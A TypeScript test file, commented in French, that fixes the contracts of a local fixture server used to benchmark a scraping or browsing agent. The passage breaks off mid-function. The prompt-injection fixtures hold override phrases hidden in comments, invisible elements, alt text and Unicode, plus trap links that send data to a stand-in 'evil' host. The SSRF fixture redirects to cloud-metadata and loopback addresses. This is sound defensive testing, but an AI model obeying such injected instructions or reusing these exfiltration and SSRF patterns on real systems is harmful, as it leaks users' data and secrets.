// SPDX-License-Identifier: AGPL-3.0-only
// Test de contrat : une entrée par fixture, qui fige ce que le reste du produit peut en attendre (15 §8, 04 §7, 17).
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { agentReference } from './agent-tasks.ts';
import { AGENT_CANARY, AGENT_HOSTS, AGENT_TRAP_TYPED_PATH } from './sites/agent-sites.ts';
import { BENCH_HOSTS, BENCH_INJECTION_CANARY, BENCH_INJECTION_SECRET, benchInjectionReference, benchStepsContacts, classifyTrapHits, INJECTION_CORPUS, STEP_MUTATIONS } from './sites/bench-sites.ts';
import { startClient, type Client, type Res } from './test-helpers.ts';

const H = (name: string): string => `zz_test_${name}.localhost`;
let fx: Client;

const body = (res: Res): unknown => JSON.parse(res.body);
const obj = (res: Res): Record<string, unknown> => body(res) as Record<string, unknown>;
const items = (value: unknown): Record<string, unknown>[] => (value as { items: Record<string, unknown>[] }).items;
const setSite = (site: string, args: Record<string, unknown>): Promise<Res> => fx.control({ op: 'site', site, ...args });
const count = async (host: string, path: string): Promise<number> => (await fx.stats()).hosts[host]?.paths[path] ?? 0;
const blob = (html: string, pattern: RegExp): string => {
  const match = pattern.exec(html);
  if (!match?.[1]) throw new Error(`blob introuvable : ${String(pattern)}`);
  return match[1];
};

type Contract = () => Promise<void>;

const contracts: Record<string, Contract> = {
  // ------------------------------------------------------------------ lot « base » (12 existantes + défi en 200)
  async api_json() {
    const page1 = obj(await fx.get(H('api_json'), '/api/contacts'));
    expect(Object.keys(page1).sort()).toEqual(['has_more', 'items', 'next_page', 'page', 'per_page', 'total']);
    expect(items(page1)).toHaveLength(20);
    expect(page1['total']).toBe(500);
    expect(Object.keys(items(page1)[0] ?? {}).sort()).toEqual(['city', 'email', 'id', 'name', 'score']);
    const last = obj(await fx.get(H('api_json'), '/api/contacts?page=25'));
    expect(last['has_more']).toBe(false);
    expect(last['next_page']).toBeNull();
    expect(items(obj(await fx.get(H('api_json'), '/api/contacts?per_page=1000')))).toHaveLength(100);
    expect((await fx.get(H('api_json'), '/')).body).toContain('/api/contacts');
    // Les mutations du banc (15 §11) changent la forme, sur commande.
    await setSite('api_json', { mutation: 'rename_field' });
    expect(items(obj(await fx.get(H('api_json'), '/api/contacts')))[0]).toHaveProperty('full_name');
    await setSite('api_json', { mutation: 'type_change' });
    expect(typeof items(obj(await fx.get(H('api_json'), '/api/contacts')))[0]?.['score']).toBe('string');
    await setSite('api_json', { mutation: 'wrap_in_envelope' });
    expect(obj(await fx.get(H('api_json'), '/api/contacts'))).toHaveProperty('data.results');
    await setSite('api_json', { mutation: 'change_pagination' });
    expect(obj(await fx.get(H('api_json'), '/api/contacts?offset=40&limit=5'))).toMatchObject({ offset: 40, limit: 5, total: 500 });
    await setSite('api_json', { mutation: 'move_endpoint' });
    expect((await fx.get(H('api_json'), '/api/contacts')).status).toBe(404);
    expect((await fx.get(H('api_json'), '/api/v2/contacts')).status).toBe(200);
    await setSite('api_json', { mutation: 'out_of_schema' });
    expect(items(obj(await fx.get(H('api_json'), '/api/contacts')))[0]).not.toHaveProperty('email');
    await setSite('api_json', { mutation: 'one_item_bad_type' });
    const bad = items(obj(await fx.get(H('api_json'), '/api/contacts')));
    expect(bad.filter((c) => typeof c['score'] === 'string')).toHaveLength(1);
    expect(bad[3]).toHaveProperty('extra.contact_email');
    await setSite('api_json', { mutation: 'bad_items_30pct' });
    expect(items(obj(await fx.get(H('api_json'), '/api/contacts'))).filter((c) => typeof c['score'] === 'string')).toHaveLength(6);
    await setSite('api_json', { mutation: 'trailing_bad_item' });
    const tail = obj(await fx.get(H('api_json'), '/api/contacts?per_page=50&page=11'));
    expect(tail).toMatchObject({ total: 501, has_more: false });
    expect(items(tail)).toEqual([expect.objectContaining({ id: 'zz_test_contact_0501', score: 'N/A' })]);
    await setSite('api_json', { mutation: 'bad_page_2' });
    expect(items(obj(await fx.get(H('api_json'), '/api/contacts?per_page=50&page=2'))).every((c) => c['score'] === 'N/A')).toBe(true);
    expect(items(obj(await fx.get(H('api_json'), '/api/contacts?per_page=50&page=3'))).some((c) => c['score'] === 'N/A')).toBe(false);
    await setSite('api_json', { mutation: 'empty' });
    expect(obj(await fx.get(H('api_json'), '/api/contacts'))['total']).toBe(0);
    expect((await setSite('api_json', { mutation: 'inconnue' })).status).toBe(400);
  },

  async ssr() {
    const page1 = (await fx.get(H('ssr'), '/')).body;
    expect(page1.match(/class="product"/g)).toHaveLength(20);
    expect(page1).toContain('rel="next"');
    expect((await fx.get(H('ssr'), '/?page=5')).body).not.toContain('rel="next"');
    expect((await fx.get(H('ssr'), '/product/zz_test_product_0001')).body).toContain('class="price"');
    expect((await fx.get(H('ssr'), '/product/zz_test_product_9999')).status).toBe(404);
  },

  async spa() {
    const shell = await fx.get(H('spa'), '/');
    expect(shell.body).toContain('id="app"');
    expect(shell.body).not.toContain('Zztest');
    expect(items(body(await fx.get(H('spa'), '/api/items.json')))).toHaveLength(30);
    expect((await fx.get(H('spa'), '/app.js')).headers['content-type']).toContain('javascript');
    expect((await fx.get(H('spa'), '/items/3')).body).toContain('id="app"');
  },

  async login() {
    const host = H('login');
    expect((await fx.get(host, '/account')).status).toBe(302);
    expect((await fx.get(host, '/account')).headers['location']).toBe('/login');
    const anonymous = await fx.get(host, '/api/orders');
    expect(anonymous.status).toBe(401);
    expect(obj(anonymous)['error']).toBe('auth_required');
    const bad = await fx.call(host, 'POST', '/login', { headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: 'username=zz_test_user&password=faux' });
    expect(bad.status).toBe(401);
    const ok = await fx.call(host, 'POST', '/login', { headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: 'username=zz_test_user&password=zz_test_pass' });
    expect(ok.status).toBe(302);
    const cookie = String(ok.headers['set-cookie']).split(';')[0] ?? '';
    expect(cookie).toMatch(/^zz_test_session=zz_test_sess_\d{4}$/);
    expect(items(body(await fx.get(host, '/api/orders', { cookie })))).toHaveLength(12);
    expect((await fx.get(host, '/account', { cookie })).body).toContain('class="order"');
    // Cas C3 et C2 (gate M2, tests/cases) : page « mes contacts » et commentaires d'un post, derrière la même session.
    expect((await fx.get(host, '/contacts')).headers['location']).toBe('/login');
    expect((await fx.get(host, '/post/zz_test_post_0001')).headers['location']).toBe('/login');
    expect((await fx.get(host, '/api/contacts')).status).toBe(401);
    expect((await fx.get(host, '/api/posts/zz_test_post_0001/comments')).status).toBe(401);
    expect((await fx.get(host, '/contacts', { cookie })).body).toContain('/api/contacts?page=1');
    expect((await fx.get(host, '/post/zz_test_post_0001', { cookie })).body).toContain('/api/posts/zz_test_post_0001/comments?page=1');
    const c1 = obj(await fx.get(host, '/api/contacts?page=1', { cookie }));
    expect(items(c1)).toHaveLength(20);
    expect(c1['has_more']).toBe(true);
    const c2 = obj(await fx.get(host, '/api/contacts?page=2', { cookie }));
    expect(items(c2)).toHaveLength(10);
    expect(c2['has_more']).toBe(false);
    const pages = [1, 2, 3].map(async (n) => obj(await fx.get(host, `/api/posts/zz_test_post_0001/comments?page=${n}`, { cookie })));
    const got = await Promise.all(pages);
    expect(got.map((g) => (g['comments'] as unknown[]).length)).toEqual([10, 10, 5]);
    expect(got.map((g) => g['has_more'])).toEqual([true, true, false]);
    await setSite('login', { action: 'expire_sessions' });
    const expired = await fx.get(host, '/api/orders', { cookie });
    expect(expired.status).toBe(401);
    expect(obj(expired)['error']).toBe('session_expired');
    expect((await fx.get(host, '/account', { cookie })).headers['location']).toBe('/login?expired=1');
  },

  async challenge() {
    const res = await fx.get(H('challenge'), '/anything');
    expect(res.status).toBe(403);
    expect(res.headers['x-zz-test-shield']).toBe('challenge');
    expect(res.body).toContain('id="zz-test-challenge"');
    // Simulation de détection seulement : aucun script, aucun jeton à soumettre.
    expect(res.body).not.toContain('<script');
    expect(res.body).not.toContain('<form');
  },

  async challenge_200() {
    const res = await fx.get(H('challenge_200'), '/liste');
    expect(res.status).toBe(200);
    expect(res.body).toContain('id="zz-test-challenge"');
    expect(res.headers['x-zz-test-shield']).toBeUndefined();
    expect(res.body).not.toContain('<script');
    await setSite('challenge_200', { with_header: true });
    expect((await fx.get(H('challenge_200'), '/liste')).headers['x-zz-test-shield']).toBe('challenge');
    // Défi qui se résout seul (côté site) : script qui pose un cookie puis recharge ; avec le cookie, des titres h1.
    await fx.reset();
    await setSite('challenge_200', { resolve_after_ms: 300 });
    const resolving = await fx.get(H('challenge_200'), '/');
    expect(resolving.status).toBe(200);
    expect(resolving.body).toContain('id="zz-test-challenge"');
    expect(resolving.body).toContain('location.reload()');
    const cleared = await fx.get(H('challenge_200'), '/', { cookie: 'zz_test_cleared=1' });
    expect(cleared.body).not.toContain('zz-test-challenge');
    expect(cleared.body.match(/<h1 class="product">/g)).toHaveLength(3);
    // Variantes muettes (revue de 1.7) : rien à reconnaître dans le contenu, seul le script agit.
    await fx.reset();
    await setSite('challenge_200', { variant: 'silent' });
    const silent = await fx.get(H('challenge_200'), '/');
    expect(silent.body).not.toMatch(/<title|verify|robot|challenge/i);
    expect(silent.body).toContain('location.reload()');
    expect((await fx.get(H('challenge_200'), '/', { cookie: 'zz_test_cleared=1' })).body.match(/<h1 class="product">/g)).toHaveLength(3);
    await setSite('challenge_200', { variant: 'offsite' });
    expect((await fx.get(H('challenge_200'), '/')).body).toContain('zz_test_evil.localhost');
    await setSite('challenge_200', { resolve_after_ms: 1000 });
    expect((await fx.get(H('challenge_200'), '/')).body).toMatch(/setTimeout\(function\(\)\{location\.href="[^"]*zz_test_evil\.localhost[^"]*";\}, 1000\)/);
    // Interstitiel au titre exact, un seul signal, sans script (revue de 1.7).
    await setSite('challenge_200', { variant: 'interruption' });
    const interruption = await fx.get(H('challenge_200'), '/');
    expect(interruption.status).toBe(200);
    expect(interruption.body).toContain('<title>Pardon Our Interruption</title>');
    expect(interruption.body).not.toMatch(/<script|verify|robot|challenge/i);
    await setSite('challenge_200', { variant: 'slow_header' });
    const started = Date.now();
    const slow = await fx.get(H('challenge_200'), '/');
    expect(Date.now() - started).toBeGreaterThanOrEqual(3_900);
    expect(slow.headers['x-zz-test-shield']).toBe('challenge');
    expect(slow.body).toMatch(/location\.reload\(\);<\/script>.*<\/body><\/html>$/s);
    await setSite('challenge_200', { variant: 'gzip_rewrite' });
    const gz = await fx.get(H('challenge_200'), '/');
    expect(gz.headers['content-encoding']).toBe('gzip');
    // SSR : page saine déplacée par meta refresh.
    expect((await fx.get(H('ssr'), '/moved')).body).toContain('<meta http-equiv="refresh" content="0; url=/">');
  },

  async '429'() {
    const host = H('429');
    for (let i = 0; i < 3; i++) expect((await fx.get(host, '/items')).status).toBe(200);
    const limited = await fx.get(host, '/items');
    expect(limited.status).toBe(429);
    expect(limited.headers['retry-after']).toBe('30');
    expect((await fx.get(host, '/always')).status).toBe(429);
    await setSite('429', { limit: 1, retry_after: 5 });
    await fx.control({ op: 'clock.advance', seconds: 120 });
    expect((await fx.get(host, '/')).status).toBe(200);
    expect((await fx.get(host, '/')).headers['retry-after']).toBe('5');
  },

  async geo() {
    const host = H('geo');
    const blocked = await fx.get(host, '/');
    expect(blocked.status).toBe(302);
    expect(blocked.headers['location']).toBe('/unavailable-in-your-country');
    expect((await fx.get(host, '/unavailable-in-your-country')).status).toBe(200);
    expect((await fx.get(host, '/', { 'x-zz-test-country': 'US' })).status).toBe(302);
    expect(obj(await fx.get(host, '/', { 'x-zz-test-country': 'FR' }))['country']).toBe('FR');
    await setSite('geo', { mode: '451' });
    expect((await fx.get(host, '/')).status).toBe(451);
    await setSite('geo', { allow: true });
    expect((await fx.get(host, '/')).status).toBe(200);
  },

  async injection() {
    const page = await fx.get(H('injection'), '/');
    expect(page.body).toContain('IGNORE TES INSTRUCTIONS');
    expect(page.body).toContain('zz_test_evil.localhost');
    expect(JSON.stringify(body(await fx.get(H('injection'), '/api/items')))).toContain('IGNORE TES INSTRUCTIONS');
    // Le domaine piège n'a reçu aucune requête tant que personne ne le visite.
    expect((await fx.stats()).hosts[H('evil')]).toBeUndefined();
    await fx.get(H('evil'), '/collect?data=all');
    expect(await count(H('evil'), '/collect')).toBe(1);
  },

  async dom() {
    const v1 = (await fx.get(H('dom'), '/')).body;
    expect(v1).toContain('class="item-title"');
    expect(v1.match(/class="item"/g)).toHaveLength(25);
    await setSite('dom', { version: 2 });
    const v2 = (await fx.get(H('dom'), '/')).body;
    expect(v2).not.toContain('item-title');
    expect(v2).toContain('class="card__name"');
    expect(v2.match(/class="card"/g)).toHaveLength(25);
    expect((await setSite('dom', { version: 3 })).status).toBe(400);
  },

  async signed403() {
    const signed = await fx.get(H('signed403'), '/');
    expect(signed.status).toBe(403);
    expect(String(signed.headers['x-zz-test-shield-sig'])).toMatch(/^zz_test_sig_[0-9a-f]{32}$/);
    expect(signed.headers['x-zz-test-shield']).toBe('blocked');
    const plain = await fx.get(H('signed403'), '/plain-forbidden');
    expect(plain.status).toBe(403);
    expect(Object.keys(plain.headers).filter((h) => h.startsWith('x-zz-test-shield'))).toEqual([]);
  },

  async irregular() {
    const res = await fx.get(H('irregular'), '/');
    expect(res.status).toBe(200);
    expect(res.body).not.toContain('</html>');
    // Seul <title> est fermé (retouche 2.8) : en HTML5 un titre non fermé avale tout le document (RCDATA).
    expect(res.body).toContain('</title>');
    expect(res.body).not.toContain('</body>');
    expect(res.body).toContain('<td>');
    expect(res.body).toContain('N/C');
    expect(res.body.match(/id=r0/g)?.length).toBeGreaterThan(1);
    expect(res.body).toContain('<b><i>');
  },

  async '503'() {
    for (const path of ['/', '/api/x', '/liste']) {
      const res = await fx.get(H('503'), path);
      expect(res.status).toBe(503);
      expect(res.headers['retry-after']).toBeUndefined();
    }
    expect((await fx.get(H('503'), '/robots.txt')).status).toBe(200);
    await setSite('503', { retry_after: 120 });
    expect((await fx.get(H('503'), '/')).headers['retry-after']).toBe('120');
  },

  // ------------------------------------------------------------------ ajouts Q1
  async ssrf() {
    const host = H('ssrf');
    const expected: Record<string, RegExp> = {
      '/to-internal': /^http:\/\/zz_test_internal\.localhost:\d+\/secret$/,
      '/to-metadata-sim': /^http:\/\/zz_test_metadata\.localhost:\d+\/latest\/meta-data\//,
      '/to-metadata': /^http:\/\/169\.254\.169\.254\//,
      '/to-rfc1918': /^http:\/\/10\.0\.0\.1\//,
      '/to-loopback': /^http:\/\/127\.0\.0\.1:1\//,
      '/to-decimal-ip': /^http:\/\/2130706433\/$/,
      '/to-hex-ip': /^http:\/\/0x7f000001\/$/,
      '/to-ipv6-loopback': /^http:\/\/\[::1\]:1\/$/,
    };
    for (const [path, pattern] of Object.entries(expected)) {
      const res = await fx.get(host, path);
      expect(res.status, path).toBe(302);
      expect(String(res.headers['location']), path).toMatch(pattern);
    }
    expect((await fx.get(host, '/to-internal?status=307')).status).toBe(307);
    // Suivre une redirection ne fait rien de lui-même : les hôtes internes restent à 0 tant que personne ne s'y connecte.
    expect((await fx.stats()).hosts[H('internal')]).toBeUndefined();
    expect((await fx.stats()).hosts[H('metadata')]).toBeUndefined();
    expect(obj(await fx.get(H('internal'), '/secret'))['secret']).toBe('zz_test_internal_secret');
    expect(await count(H('internal'), '/secret')).toBe(1);
    expect((await fx.get(H('metadata'), '/latest/meta-data/iam/security-credentials/')).body).toContain('zz_test_metadata_key');
    expect(await count(H('metadata'), '/latest/meta-data/iam/security-credentials/')).toBe(1);
  },

  async slow() {
    const fast = Date.now();
    await fx.get(H('slow'), '/');
    expect(Date.now() - fast).toBeLessThan(200);
    const started = Date.now();
    const res = await fx.get(H('slow'), '/?wait_seconds=0.15');
    expect(Date.now() - started).toBeGreaterThanOrEqual(140);
    expect(obj(res)['waited_seconds']).toBe(0.15);
    await setSite('slow', { default_wait_seconds: 0.1 });
    const again = Date.now();
    await fx.get(H('slow'), '/items');
    expect(Date.now() - again).toBeGreaterThanOrEqual(90);
  },

  async volume() {
    const host = H('volume');
    const all = async (): Promise<number> => {
      let n = 0;
      for (let p = 1; p <= 6; p++) n += items(body(await fx.get(host, `/api/items?page=${p}`))).length;
      return n;
    };
    expect(await all()).toBe(100);
    expect(obj(await fx.get(host, '/api/items?page=5'))['has_more']).toBe(false);
    await setSite('volume', { mode: 'anomaly' });
    expect(await all()).toBe(40);
    await setSite('volume', { mode: 'empty' });
    expect(await all()).toBe(0);
    await setSite('volume', { mode: 'short' });
    expect(obj(await fx.get(host, '/api/items?page=2'))['has_more']).toBe(true);
    const short = obj(await fx.get(host, '/api/items?page=3'));
    expect(short['items']).toEqual([]);
    expect(short).not.toHaveProperty('has_more');
    expect(short['total']).toBe(100);
  },

  async personal() {
    const people = items(body(await fx.get(H('personal'), '/api/people')));
    expect(people).toHaveLength(10);
    for (const person of people) {
      expect(person['email']).toMatch(/^zz_test_person_\d{3}@example\.invalid$/);
      expect(person['phone']).toMatch(/^\+33 1 99 00 \d{2} \d{2}$/);
      expect(person['name']).toMatch(/Zztest\d{3}$/);
    }
    expect(obj(await fx.get(H('personal'), '/api/people?page=3'))['has_more']).toBe(false);
    expect((await fx.get(H('personal'), '/')).body).toContain('class="email"');
  },

  async scroll() {
    const host = H('scroll');
    expect((await fx.get(host, '/')).body.match(/class="feed-item"/g)).toHaveLength(10);
    expect((await fx.get(host, '/')).body).toContain('IntersectionObserver');
    const tail = obj(await fx.get(host, '/api/feed?offset=50&limit=10'));
    expect(items(tail)).toHaveLength(10);
    expect(tail['done']).toBe(true);
    expect(obj(await fx.get(host, '/api/feed?offset=10&limit=10'))['done']).toBe(false);
  },

  // ------------------------------------------------------------------ ajouts S5
  async next() {
    const html = (await fx.get(H('next'), '/')).body;
    const data = JSON.parse(blob(html, /<script id="__NEXT_DATA__" type="application\/json">(.*?)<\/script>/s)) as { props: { pageProps: { products: unknown[] } }; buildId: string };
    expect(data.props.pageProps.products).toHaveLength(10);
    expect(data.buildId).toBe('zz_test_build');
    expect(html).toContain('<div id="root"></div>');
    expect(html).not.toContain('class="product"');
    expect((await fx.get(H('next'), '/api/products')).status).toBe(404);
  },

  async nuxt() {
    const flat = JSON.parse(blob((await fx.get(H('nuxt'), '/')).body, /id="__NUXT_DATA__">(.*?)<\/script>/s)) as unknown[];
    const root = flat[0] as Record<string, number>;
    const data = flat[root['data'] as number] as Record<string, number>;
    const products = flat[data['products'] as number] as number[];
    expect(products).toHaveLength(10);
    const first = flat[products[0] as number] as Record<string, number>;
    expect(flat[first['id'] as number]).toBe('zz_test_product_0001');
    const legacy = JSON.parse(blob((await fx.get(H('nuxt'), '/legacy')).body, /window\.__NUXT__=(.*?)<\/script>/s).replace(/;$/, '')) as { data: { products: unknown[] }[] };
    expect(legacy.data[0]?.products).toHaveLength(10);
  },

  async apollo() {
    const state = JSON.parse(blob((await fx.get(H('apollo'), '/')).body, /window\.__APOLLO_STATE__=(.*?);<\/script>/s)) as Record<string, Record<string, unknown>>;
    const refs = state['ROOT_QUERY']?.['products({"first":10})'] as { __ref: string }[];
    expect(refs).toHaveLength(10);
    expect(state[refs[0]?.__ref ?? '']).toMatchObject({ __typename: 'Product', id: 'zz_test_product_0001' });
  },

  async jsonld() {
    const html = (await fx.get(H('jsonld'), '/')).body;
    const blocks = [...html.matchAll(/<script type="application\/ld\+json">(.*?)<\/script>/gs)].map((m) => JSON.parse(m[1] ?? '{}') as Record<string, unknown>);
    expect(blocks.map((b) => b['@type'])).toEqual(['ItemList', 'BreadcrumbList']);
    expect((blocks[0]?.['itemListElement'] as unknown[]).length).toBe(10);
  },

  async cursor() {
    const host = H('cursor');
    const seen: string[] = [];
    let next: string | null = '';
    let pages = 0;
    while (next !== null && pages < 20) {
      const res: Record<string, unknown> = obj(await fx.get(host, `/api/items?limit=30${next ? `&cursor=${encodeURIComponent(next)}` : ''}`));
      for (const item of res['data'] as { id: string }[]) seen.push(item.id);
      next = res['next_cursor'] as string | null;
      pages++;
    }
    expect(pages).toBe(4);
    expect(new Set(seen).size).toBe(95);
    expect((await fx.get(host, '/api/items?cursor=zzz')).status).toBe(400);
  },

  async linkheader() {
    const host = H('linkheader');
    const seen: string[] = [];
    let path: string | undefined = '/api/items?page=1';
    let pages = 0;
    while (path && pages < 20) {
      const res: Res = await fx.get(host, path);
      expect(res.headers['x-total-count']).toBe('57');
      for (const item of body(res) as { id: string }[]) seen.push(item.id);
      const next = /<([^>]+)>;\s*rel="next"/.exec(String(res.headers['link']));
      path = next?.[1] ? new URL(next[1]).pathname + new URL(next[1]).search : undefined;
      pages++;
    }
    expect(pages).toBe(3);
    expect(new Set(seen).size).toBe(57);
    const last = String((await fx.get(host, '/api/items?page=3')).headers['link']);
    expect(last).toContain('rel="prev"');
    expect(last).not.toContain('rel="next"');
  },

  // ------------------------------------------------------------------ accès (O8)
  async robots() {
    const host = H('robots');
    const robots = await fx.get(host, '/robots.txt');
    expect(robots.body).toContain('Disallow: /prive/');
    expect(robots.body).toContain('Allow: /prive/ouvert');
    // Le compteur est la base de « 0 requête sur le chemin interdit ».
    expect(await count(host, '/prive/liste')).toBe(0);
    expect((await fx.get(host, '/prive/liste')).status).toBe(200);
    expect(await count(host, '/prive/liste')).toBe(1);
    expect(await count(host, '/robots.txt')).toBe(1);
  },

  async robots_4xx() {
    const host = H('robots_4xx');
    expect((await fx.get(host, '/robots.txt')).status).toBe(404);
    expect((await fx.get(host, '/prive/liste')).status).toBe(200);
    await setSite('robots_4xx', { status: 403 });
    expect((await fx.get(host, '/robots.txt')).status).toBe(403);
    expect((await setSite('robots_4xx', { status: 503 })).status).toBe(400);
  },

  async robots_5xx() {
    const host = H('robots_5xx');
    expect((await fx.get(host, '/robots.txt')).status).toBe(503);
    await setSite('robots_5xx', { mode: 500 });
    expect((await fx.get(host, '/robots.txt')).status).toBe(500);
    await setSite('robots_5xx', { mode: 'drop' });
    await expect(fx.get(host, '/robots.txt')).rejects.toThrow();
    expect((await fx.get(host, '/liste')).status).toBe(200);
  },

  async robots_redirect() {
    const host = H('robots_redirect');
    const hop1 = await fx.get(host, '/robots.txt');
    expect(hop1.status).toBe(301);
    const hop2 = await fx.get(host, String(hop1.headers['location']));
    expect(hop2.status).toBe(301);
    expect(hop2.headers['location']).toBe('/robots-final.txt');
    expect((await fx.get(host, '/robots-final.txt')).body).toContain('Disallow: /prive/');
    await setSite('robots_redirect', { hops: 1 });
    expect((await fx.get(host, '/robots.txt')).headers['location']).toBe('/robots-final.txt');
    await setSite('robots_redirect', { hops: 0 });
    expect((await fx.get(host, '/robots.txt')).body).toContain('Disallow: /prive/');
    await setSite('robots_redirect', { loop: true });
    expect((await fx.get(host, '/robots.txt')).headers['location']).toBe('/robots.txt');
  },

  async robots_big() {
    const res = await fx.get(H('robots_big'), '/robots.txt');
    const size = Buffer.byteLength(res.body);
    expect(size).toBeGreaterThan(500 * 1024);
    expect(res.body.indexOf('Disallow: /early/')).toBeLessThan(500 * 1024);
    expect(res.body.indexOf('Disallow: /late/')).toBeGreaterThan(500 * 1024);
  },

  async robots_crawl_delay() {
    const host = H('robots_crawl_delay');
    expect((await fx.get(host, '/robots.txt')).body).toContain('Crawl-delay: 5');
    await setSite('robots_crawl_delay', { delay: 2 });
    expect((await fx.get(host, '/robots.txt')).body).toContain('Crawl-delay: 2');
    expect((await setSite('robots_crawl_delay', { delay: -1 })).status).toBe(400);
  },

  async content_signal() {
    const host = H('content_signal');
    expect((await fx.get(host, '/robots.txt')).body).toContain('Content-Signal: ai-train=no, search=yes, ai-input=no');
    const res = await fx.get(host, '/liste');
    expect(res.status).toBe(200);
    expect(res.headers['content-signal']).toBe('ai-train=no, search=yes, ai-input=no');
    expect(res.headers['content-usage']).toBe('train-ai=n');
    expect(res.headers['tdm-reservation']).toBe('1');
  },

  async payment_402() {
    const host = H('payment_402');
    expect((await fx.get(host, '/robots.txt')).status).toBe(200);
    const res = await fx.get(host, '/');
    expect(res.status).toBe(402);
    expect(res.headers['crawler-price']).toBe('USD 0.01');
    expect(obj(res)).toMatchObject({ error: 'payment_required', price: { amount: '0.01', currency: 'USD' } });
    expect((await fx.get(host, '/free')).status).toBe(200);
    await setSite('payment_402', { price: '0.25' });
    expect((await fx.get(host, '/')).headers['crawler-price']).toBe('USD 0.25');
  },

  // ------------------------------------------------------------------ spike 0.6a (E4, E5, E6, injection)
  async agent_irregular_html() {
    const host = H('agent_irregular_html');
    const res = await fx.get(host, '/');
    expect(res.status).toBe(200);
    const reference = agentReference('F-E4') as { items: { id: string; title: string; category: string | null }[] };
    for (const item of reference.items) {
      expect(res.body).toContain(item.id);
      expect(res.body).toContain(item.title);
    }
    // Gabarits hétérogènes : au moins 4 formes de bloc, catégorie parfois absente, aucune API JSON.
    for (const marker of ['class="fiche"', '<table class="t">', '<p>Le modèle', '<dl>']) expect(res.body).toContain(marker);
    expect(reference.items.some((i) => i.category === null)).toBe(true);
    expect(res.body).not.toMatch(/application\/json|<script/);
    expect((await fx.get(host, '/api/items')).status).toBe(404);
    expect((await fx.get(host, '/')).body).toBe(res.body);
  },

  async agent_mobile_next() {
    const host = H('agent_mobile_next');
    const res = await fx.get(host, '/');
    expect(res.body).toContain('name="viewport"');
    // Bouton « Suivant » sans lien exploitable : pas de href, pas de formulaire, pagination par interaction seulement.
    expect(res.body).toMatch(/<button type="button" id="next">Suivant<\/button>/);
    expect(res.body).not.toMatch(/href=|<form|\?page=/);
    expect(res.body).toContain('Page 1 / 3');
    const reference = agentReference('F-E5') as { items: { id: string; name: string; city: string }[] };
    expect(reference.items).toHaveLength(12);
    for (const item of reference.items) expect(res.body).toContain(`"${item.id}","${item.name}","${item.city}"`);
    expect((await fx.get(host, '/?page=2')).body).toBe(res.body);
  },

  async agent_no_api_unstable_dom() {
    const host = H('agent_no_api_unstable_dom');
    const first = (await fx.get(host, '/')).body;
    const second = (await fx.get(host, '/')).body;
    // Classes, identifiants et liens changent à chaque requête ; les données restent.
    expect(first).not.toBe(second);
    const links = (body: string): string[] => [...body.matchAll(/href="(\/v\/[a-z0-9]+)"/g)].map((m) => m[1] ?? '');
    expect(links(first)).toHaveLength(6);
    expect(links(first).filter((l) => links(second).includes(l))).toEqual([]);
    const reference = agentReference('F-E6') as { id: string; title: string; reference: string; weight_g: number; color: string };
    const titleAt = first.indexOf(reference.title);
    expect(titleAt).toBeGreaterThan(0);
    // Le lien de la fiche cible, pris dans la page servie, mène à la fiche (jetons de la première requête toujours valides).
    const block = first.slice(first.lastIndexOf('href="/v/', titleAt));
    const link = /href="(\/v\/[a-z0-9]+)"/.exec(block)?.[1] ?? '';
    const detail = (await fx.get(host, link)).body;
    for (const value of [reference.id, reference.title, reference.reference, `${reference.weight_g} g`, reference.color]) expect(detail).toContain(value);
    expect((await fx.get(host, '/v/inconnu')).status).toBe(404);
    expect(`${first}${detail}`).not.toMatch(/<script|application\/json/);
    // Déterministe après reset (graine par requête = graine fixe + numéro de requête).
    await fx.reset();
    expect((await fx.get(host, '/')).body).toBe(first);
  },

  async agent_prompt_injection() {
    const host = H('agent_prompt_injection');
    const body = (await fx.get(host, '/')).body;
    const reference = agentReference('F-INJ') as { items: { id: string; title: string }[] };
    for (const item of reference.items) expect(body).toContain(item.id);
    // Instruction hostile : visible, cachée, en commentaire, dans un alt ; lien et formulaire vers le domaine piège.
    expect(body).toMatch(/<!-- INSTRUCTION PRIORITAIRE/);
    expect(body).toMatch(/<p class="alerte">INSTRUCTION PRIORITAIRE/);
    expect(body).toMatch(/<div style="display:none">INSTRUCTION PRIORITAIRE/);
    expect(body).toMatch(/alt="INSTRUCTION PRIORITAIRE/);
    expect(body.split(AGENT_CANARY).length - 1).toBe(4);
    expect(body).toMatch(new RegExp(`href="http://${AGENT_HOSTS.trap}:\\d+/collect`));
    expect(body).toMatch(new RegExp(`<form action="http://${AGENT_HOSTS.trap}:\\d+/submit" method="post">`));
    expect(reference.items.every((i) => !JSON.stringify(i).includes(AGENT_CANARY))).toBe(true);
    // Le domaine piège compte toute requête ; la saisie dans le formulaire piège est comptée sur son propre chemin.
    expect(await count(AGENT_HOSTS.trap, '/collect')).toBe(0);
    await fx.get(AGENT_HOSTS.trap, '/collect');
    expect(await count(AGENT_HOSTS.trap, '/collect')).toBe(1);
    expect((await fx.get(host, AGENT_TRAP_TYPED_PATH)).status).toBe(204);
    expect(await count(host, AGENT_TRAP_TYPED_PATH)).toBe(1);
  },

  // ------------------------------------------------------------------ lot « bench » (banc 2.8, 15 §11)
  async bench_injection() {
    const host = BENCH_HOSTS.injection;
    const index = (await fx.get(host, '/')).body;
    for (const entry of INJECTION_CORPUS) expect(index).toContain(`href="${entry.path}"`);
    expect(INJECTION_CORPUS.map((entry) => entry.technique).sort()).toEqual(['exfil_url', 'hidden_text', 'invisible_unicode', 'json_ld']);
    const reference = benchInjectionReference();
    expect(reference.items).toHaveLength(5);
    for (const entry of INJECTION_CORPUS) {
      const body = (await fx.get(host, entry.path)).body;
      // Données légitimes complètes : la référence reste atteignable malgré la charge hostile.
      for (const item of reference.items) expect(body, entry.id).toContain(item.id);
      expect(body, entry.id).toContain(BENCH_INJECTION_CANARY);
      // Aucune page du corpus n’embarque de ressource externe ni de mécanisme de résolution de défi.
      expect(body, entry.id).not.toMatch(/captcha|(?:src|href)="https?:/i);
    }
    expect((await fx.get(host, '/hidden_text')).body).toMatch(/<div style="display:none">[^<]*IGNORE/);
    const ld = blob((await fx.get(host, '/json_ld')).body, /<script type="application\/ld\+json">([\s\S]*?)<\/script>/);
    expect(JSON.stringify(JSON.parse(ld))).toContain(BENCH_INJECTION_CANARY);
    const unicode = (await fx.get(host, '/invisible_unicode')).body;
    expect(unicode).toContain('\u200b');
    expect(/[\u{E0000}-\u{E007F}]/u.test(unicode)).toBe(true);
    const exfil = (await fx.get(host, '/exfil_url')).body;
    expect(exfil).toContain(BENCH_INJECTION_SECRET);
